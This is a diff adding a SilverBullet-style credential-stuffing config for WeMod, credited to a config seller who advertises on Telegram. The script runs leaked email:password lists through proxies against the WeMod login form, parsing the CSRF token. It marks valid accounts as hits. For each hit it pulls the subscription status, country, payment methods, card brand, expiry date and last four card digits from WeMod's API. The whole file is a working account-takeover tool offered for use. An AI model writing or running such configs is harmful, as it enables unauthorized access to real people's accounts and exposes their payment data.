@@ -1,0 +1,176 @@
+[SETTINGS]
+{
+  "Name": "WeMod PRO",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2025-03-16T04:46:31.9187646+04:00",
+  "AdditionalInfo": "For more configs join us on Telegram: https://t.me/svbc0nfigmaker",
+  "RequiredPlugins": [],
+  "Author": "░░░▒▓ ♛ SVBCONFIGSMAKER ♛ ▓▒░░░ ",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "Default",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "WeMod PRO",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#ENC FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#GET REQUEST GET "https://www.wemod.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" CSS "[name=_token]" "value" -> VAR "Token" 
+
+#POST REQUEST POST "https://www.wemod.com/login" 
+  CONTENT "_token=<Token>&username=<USER>&password=<PS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.wemod.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.wemod.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.wemod.com/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 96" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username, email address, or password." 
+  KEYCHAIN Success OR 
+    KEY "https://www.wemod.com/account" 
+    KEY "<ADDRESS>" Contains "https://www.wemod.com/account" 
+
+PARSE "<SOURCE>" CSS "[name=username]" "value" CreateEmpty=FALSE -> CAP "Username" 
+
+REQUEST GET "https://www.wemod.com/account/billing" 
+  
+  HEADER "Host: www.wemod.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "DNT: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.wemod.com/account" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#accessToken PARSE "<SOURCE>" LR "\"accessToken\":\"" "\"" -> VAR "TOKEN2" 
+
+#ACCOUNT REQUEST GET "https://api.wemod.com/v3/account" 
+  
+  HEADER "Authorization: Bearer <TOKEN2>" 
+
+PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "Username" 
+
+PARSE "<SOURCE>" LR "\"accountCountry\":\"" "\"}}" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "\"subscription\":" "," CreateEmpty=FALSE -> CAP "Subscription" 
+
+PARSE "<SOURCE>" LR "\"joinedAt\":\"" "T" CreateEmpty=FALSE -> CAP "memberSince" 
+
+PARSE "<SOURCE>" LR "\"timeLimit\":{\"enabled\":" "}" CreateEmpty=FALSE -> CAP "HasTimeLimit" 
+
+PARSE "<SOURCE>" LR "\"modControls\":{\"enabled\":" "}}" CreateEmpty=FALSE -> CAP "HasModControls" 
+
+PARSE "<SOURCE>" LR "\"boosts\":" "," CreateEmpty=FALSE -> CAP "TotalBoosts" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<HasTimeLimit>" Contains "true" 
+  KEYCHAIN Success OR 
+    KEY "<HasTimeLimit>" Contains "false" 
+
+#PAYMENTMETHOD REQUEST GET "https://api.wemod.com/v3/checkout/methods" 
+  
+  HEADER "Authorization: Bearer <TOKEN2>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "NO PAYMENT" OR 
+    KEY "{\"methods\":[]" 
+  KEYCHAIN Success OR 
+    KEY "{\"methods\":[{\"id\":\"" 
+
+PARSE "<SOURCE>" LR "\"type\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Payment_Method" 
+
+PARSE "<SOURCE>" JSON "brand" Recursive=TRUE CreateEmpty=FALSE -> CAP "card_Brand" 
+
+PARSE "<SOURCE>" JSON "brandName" Recursive=TRUE CreateEmpty=FALSE -> CAP "card_Type" 
+
+PARSE "<SOURCE>" LR "\"expMonth\":" "," -> VAR "MES" 
+
+PARSE "<SOURCE>" LR "\"expYear\":" "}" -> VAR "ANO" 
+
+FUNCTION Constant "[<MES>/<ANO>]" -> CAP "card_Expiry" 
+
+PARSE "<SOURCE>" JSON "lastFour" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card_Last4" 
+
+#AUTHOR FUNCTION Constant "░░░▒▓ ♛ SVBCONFIGSMAKER ♛ ▓▒░░░" -> CAP "ConfigBy " 
+
